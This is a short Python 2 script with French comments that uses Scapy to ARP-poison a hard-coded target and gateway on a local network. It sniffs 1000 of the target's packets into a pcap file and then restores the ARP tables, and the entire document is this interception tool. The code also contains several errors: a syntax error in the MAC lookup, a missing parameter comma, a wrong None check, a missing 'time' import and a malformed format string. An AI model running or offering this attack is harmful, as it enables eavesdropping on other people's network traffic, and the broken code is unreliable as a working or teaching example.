from scapy.all import *
import os,sys,threading,signal

interface="en1" # mettre votre nom d'interface
target_ip="192.168.1.37"	#ip de la cibel
gateway_ip="192.168.1.254"	#ip de la passerelle
packet_count=1000


conf.iface = interface
conf.verb =  0
def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
	print "[*] Restauration d ela cible..."
	send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
	send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
	os.kill(os.getpid(),signal.SIGINT)

def get_mac(ip_address):
	responses,unanswered=srp(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
	for s,r in responses:
		return r[Ether].src
	return None

def poison_target(gateway_ip,gateway_mactarget_ip,target_mac):
	poison_target=ARP()
	poison_target.op=2
	poison_target.psrc=gateway_ip
	poison_target.pdst=target_ip
	poison_target.hwdst=target_mac
	poison_gateway=ARP()
	poison_gateway.op=2
	poison_gateway.psrc=target_ip
	poison_gateway.pdst=gateway_ip
	poison_gateway.hwdst=gateway_mac

	print "[*] Debut de l'arp poisonning.[CTRL-C pour arreter]"
	while True:
		try:
			send(poison_target)
			send(poison_gateway)
			time.sleep(2)
		except KeyboardInterrupt:
			restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
	print "[*] L'attaque ARP poisonning est finie."
	return

print "[*] Configuration de l'interface %s" %interface
gateway_mac=get_mac(gateway_ip)
if gateway_mac is None:
	print "[!!!] Impossible de recuperer la MAC de la passerelle."
	sys.exit(0)
else:
	print "[*]La passerelle %s a pour MAC: %s"%(gateway_ip,gateway_mac)
target_mac = get_mac(target_ip)
if target_ip is None:
	print "[!!!] Impossible de recuperer la MAC de la cible."
	sys.exit(0)
else:
	print "[*]La cible %s a pour MAC: %s"%(target_ip,target_mac)

poison_thread = threading.Thread(target=poison_target, args=(gateway_ip,gateway_mac,target_ip,target_mac))
poison_thread.start()
try:
	print "[*] Debut de l'ecoute pour % paquets"% packet_count
	bpf_filter = "ip host %s"%target_ip
	packets=sniff(count=packet_count,filter=bpf_filter,iface=interface)
	wrpcap('arper.pcap',packets)
	restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
except:
	restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
	sys.exit(0)
